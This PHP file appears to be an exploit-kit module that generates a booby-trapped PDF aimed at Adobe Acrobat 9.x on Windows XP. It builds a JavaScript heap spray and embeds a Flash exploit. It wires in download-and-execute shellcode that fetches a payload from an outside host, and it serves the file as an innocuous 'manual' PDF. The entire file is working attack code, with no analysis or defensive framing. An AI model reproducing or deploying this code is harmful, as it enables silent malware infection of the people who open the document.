<?php
#windows xp xp2/sp3; Adobe acrobat 9.0 - 9.3.2

include_once('config.php');
include("include/util.php");
include("include/shellcode.php");

function generate_swf(){
	$swf = @file_get_contents("modules/helpers/Adobe-2010-1297.swf");
	return $swf;
}

function generate_js($url){

	$js = "function Lookup(num){";
	$js = $js . "return String.fromCharCode(num)";
	$js = $js . "}";


	$js = $js . "var padding = String.fromCharCode((3084), (3084));";
	
	$js = $js . "while (padding.length < 65564){";
	$js = $js . "	padding+=padding;";
	$js = $js . "}";

	$js = $js . "var Yesterday = '';";

	$js = $js . "Yesterday = Yesterday + Lookup(3084);";
	$js = $js . "Yesterday = Yesterday + Lookup(3084);";
	$js = $js . "Yesterday = Yesterday + Lookup(16447);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(52428);";
	$js = $js . "Yesterday = Yesterday + Lookup(52428);";
	$js = $js . "Yesterday = Yesterday + Lookup(7866);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(16677);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(52428);";
	$js = $js . "Yesterday = Yesterday + Lookup(52428);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(8080);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(7866);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(29096);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(3084);";
	$js = $js . "Yesterday = Yesterday + Lookup(3084);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(8080);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(36924);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(46738);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(8904);";
	$js = $js . "Yesterday = Yesterday + Lookup(19077);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(4096);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(2);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(258);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(25509);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(11698);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(10929);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(8);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(43174);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(8080);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(36920);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(46738);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(65535);";
	$js = $js . "Yesterday = Yesterday + Lookup(65535);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(64);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(1);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(25509);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(11698);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(10929);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(8);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(43174);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(8080);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(36912);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(46738);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4196);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(65535);";
	$js = $js . "Yesterday = Yesterday + Lookup(65535);";
	$js = $js . "Yesterday = Yesterday + Lookup(34);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(0);";
	$js = $js . "Yesterday = Yesterday + Lookup(1);";
	$js = $js . "Yesterday = Yesterday + Lookup(25509);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4);";
	$js = $js . "Yesterday = Yesterday + Lookup(19082);";
	$js = $js . "Yesterday = Yesterday + Lookup(8598);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(36954);";
	$js = $js . "Yesterday = Yesterday + Lookup(36948);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(60250);";
	$js = $js . "Yesterday = Yesterday + Lookup(22549);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(6795);";
	$js = $js . "Yesterday = Yesterday + Lookup(6281);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(49283);";
	$js = $js . "Yesterday = Yesterday + Lookup(33540);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(1218);";
	$js = $js . "Yesterday = Yesterday + Lookup(64385);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(3084);";
	$js = $js . "Yesterday = Yesterday + Lookup(3084);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(61045);";
	$js = $js . "Yesterday = Yesterday + Lookup(1515);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(59112);";
	$js = $js . "Yesterday = Yesterday + Lookup(65535);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(37119);";
	$js = $js . "Yesterday = Yesterday + Lookup(37008);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(37008);";
	$js = $js . "Yesterday = Yesterday + Lookup(37008);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(37008);";
	$js = $js . "Yesterday = Yesterday + Lookup(37008);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(46784);";
	$js = $js . "Yesterday = Yesterday + Lookup(19073);";
	$js = $js . "Yesterday = Yesterday + Lookup(34084);";
	$js = $js . "Yesterday = Yesterday + Lookup(19076);";
	$js = $js . "Yesterday = Yesterday + Lookup(65535);";
	$js = $js . "Yesterday = Yesterday + Lookup(37119);";
	$js = $js . "Yesterday = Yesterday + Lookup(1979);";
	$js = $js . "Yesterday = Yesterday + Lookup(19074);";
	$js = $js . "Yesterday = Yesterday + Lookup(8080);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(4);";
	$js = $js . "Yesterday = Yesterday + Lookup(19082);";
	$js = $js . "Yesterday = Yesterday + Lookup(42968);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";
	$js = $js . "Yesterday = Yesterday + Lookup(25850);";
	$js = $js . "Yesterday = Yesterday + Lookup(19072);";

	$js = $js . "var html = Yesterday + '" . shellcode_dl_exec_js($url) . "';";	

	$js = $js . "var value = padding.substring(0, 0x5f4);";
	$js = $js . "value += html;";
	$js = $js . "value += padding;";
	$js = $js . "var destination = value.substring(0, 32768);";

	$js = $js . "while(1){";
	$js = $js . "	destination += destination;";
	$js = $js . "	if(destination.length >= 524288) break;";
	$js = $js . "}";
		
	$js = $js . "var today = destination.substring(0, 524288 - 2060);";
	$js = $js . "var forever = new Array();";
	$js = $js . "for (var infinite = 0; infinite < 496; infinite++){";
	$js = $js . "	forever[infinite]=today+'s';";
	$js = $js . "}";


	return $js;

}

function generate_pdf($url){
				
		$js = generate_js($url);
		$js = pdf_FlateEncode($js);		
		//$js = pdf_ASCII85Encode($js);
		$js = pdf_ASCIIHexEncode($js);		
		$jslen = strlen($js);

		$swf = generate_swf();
				
		//$swf = pdf_ASCII85Encode($swf);	
		$swf = pdf_ASCIIHexEncode($swf);			
		$swf = pdf_FlateEncode($swf);		
		$swflen = strlen($swf);

		$swfname = "Adobe.swf";
		
		$eol = "\n";
		$endobj = "endobj" . $eol;
		
		
		
		$xref = array();
		
		$pdf = "%PDF-1.7" . $eol;
		$pdf = $pdf . "%" . RandomNonASCIIString(4) . $eol;


		# catalog
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(1) . "<<";
		$pdf = $pdf . "/Pages " . ioRef(3);
		$pdf = $pdf . "/OpenAction " . ioRef(5);
		$pdf = $pdf . "/AcroForm " . ioRef(17);
		$pdf = $pdf . "/Type/Catalog>>";
		$pdf = $pdf . $eol . $endobj;

		# pages array
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(3) . "<</Count 1/Kids[" . ioRef(4) . "]/Type/Pages>>" . $eol . $endobj;

		# page 1
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(4) . "<</Parent " . ioRef(3);
		$pdf = $pdf . "/Annots [" . ioRef(7) . "] ";
		$pdf = $pdf . "/Type/Page>>";
		$pdf = $pdf . $eol . $endobj;

		# js action
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(5) . "<</JS " . ioRef(6) . "/S/JavaScript/Type/Action>>" . $eol . $endobj;

		# js stream
		$xref[] = strlen($pdf);		
		$pdf = $pdf . ioDef(6) . "<</Filter[/ASCIIHexDecode/FlateDecode]/Length " . $jslen . ">>" . $eol;		
		$pdf = $pdf . "stream" . $eol;
		$pdf = $pdf . $js . $eol;
		$pdf = $pdf . "endstream" . $eol;
		$pdf = $pdf . $endobj;

		# swf annotation object
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(7) . "<<";
		$pdf = $pdf . "/Rect [86.1384 585.793 313.138 753.793] ";
		$pdf = $pdf . "/RichMediaSettings " . ioRef(8);
		$pdf = $pdf . "/RichMediaContent " . ioRef(9);
		$pdf = $pdf . "/NM (" . $swfname . ")";
		$pdf = $pdf . "/Subtype/RichMedia/Type/Annot>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media settings
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(8);
		$pdf = $pdf . "<</Subtype/application#2Fx-shockwave-flash";
		$pdf = $pdf . "/Activation " . ioRef(10);
		$pdf = $pdf . "/Deactivation " . ioRef(11);
		$pdf = $pdf . "/Type/RichMediaSettings>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media content
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(9);
		$pdf = $pdf . "<<";
		$pdf = $pdf . "/Assets " . ioRef(12);
		$pdf = $pdf . "/Configurations [" . ioRef(14) . "]";
		$pdf = $pdf . "/Type/RichMediaContent>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media activation / deactivation
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(10);
		$pdf = $pdf . "<</Condition/PO/Type/RichMediaActivation>>";
		$pdf = $pdf . $eol . $endobj;

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(11);
		$pdf = $pdf . "<</Condition/XD/Type/RichMediaDeactivation>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media assets
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(12);
		$pdf = $pdf . "<</Names [(" . $swfname . ") " . ioRef(13) . "]>>";
		$pdf = $pdf . $eol . $endobj;

		# swf embeded file ref
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(13);
		$pdf = $pdf . "<< /EF <</F " . ioRef(16) . ">> /F(" . $swfname . ")/Type/Filespec>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media configuration
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(14);
		$pdf = $pdf . "<</Subtype/application#2Fx-shockwave-flash";
		$pdf = $pdf . "/Instances [" . ioRef(15) . "]/Type/RichMediaConfiguration>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media isntance
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(15);
		$pdf = $pdf . "<</Subtype/application#2Fx-shockwave-flash";
		$pdf = $pdf . "/Asset " . ioRef(13);
		$pdf = $pdf . "/Type/RichMediaInstance>>";
		$pdf = $pdf . $eol . $endobj;

		# swf stream		
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(16) . "<</Filter[/FlateDecode/ASCIIHexDecode]/Length " . $swflen . "/Type/EmbeddedFile>>" . $eol;
		$pdf = $pdf . "stream" . $eol;
		$pdf = $pdf . $swf . $eol;
		$pdf = $pdf . "endstream" . $eol;
		$pdf = $pdf . $endobj;

		###
		# The following form related Yesterday is required to get icucnv36.dll to load
		###

		# form object
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(17);
		$pdf = $pdf . "<</XFA " . ioRef(18) . ">>" . $eol;
		$pdf = $pdf . $endobj;

		# form stream
		$xfa = '<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/2.6/">
<present><pdf><interactive>1</interactive></pdf></present>
</config>
<template xmlns="http://www.xfa.org/schema/xfa-template/2.6/">
<subform name="form1" layout="tb" locale="en_US">
<pageSet></pageSet>
</subform></template></xdp:xdp>';

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(18) . "<</Length " . strlen($xfa) . ">>" . $eol;
		$pdf = $pdf . "stream" . $eol;
		$pdf = $pdf . $xfa . $eol;
		$pdf = $pdf . "endstream" . $eol;
		$pdf = $pdf . $endobj;

		###
		# end form stuff for icucnv36.dll
		###

		# trailing stuff
		$xrefPosition = strlen($pdf);
		
		$pdf = $pdf . "xref" . $eol;
		$pdf = $pdf . "0 " . (count($xref) + 1) . $eol;
		$pdf = $pdf . "0000000000 65535 f" . $eol;
		
		for($i = 0; $i < count($xref); $i++){
			$temp = sprintf("%010d 00000 n", $xref[$i]);
			$pdf = $pdf . $temp . $eol;
		}
		
		$pdf = $pdf . "trailer" . $eol;
		$pdf = $pdf . "<</Size " . (count($xref) + 1) . "/Root " . ioRef(1) . ">>" . $eol;
		$pdf = $pdf . "startxref" . $eol;
		$pdf = $pdf . $xrefPosition . $eol;
		$pdf = $pdf . "%%EOF" . $eol;

		return $pdf;
}

$pdf = generate_pdf("http://drztgoddobmyr.com/555/ble/download_file.php?e=Adobe-2010-1297");

header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache");
header("Pragma: no-cache");
header("Accept-Ranges: bytes\r\n");
header("Content-Length: " . strlen($pdf) . "\r\n");
header("Content-Disposition: inline; filename=manual20101297.pdf");
header("\r\n");
header("Content-Type: application/pdf\r\n\r\n");
echo $pdf;
?>
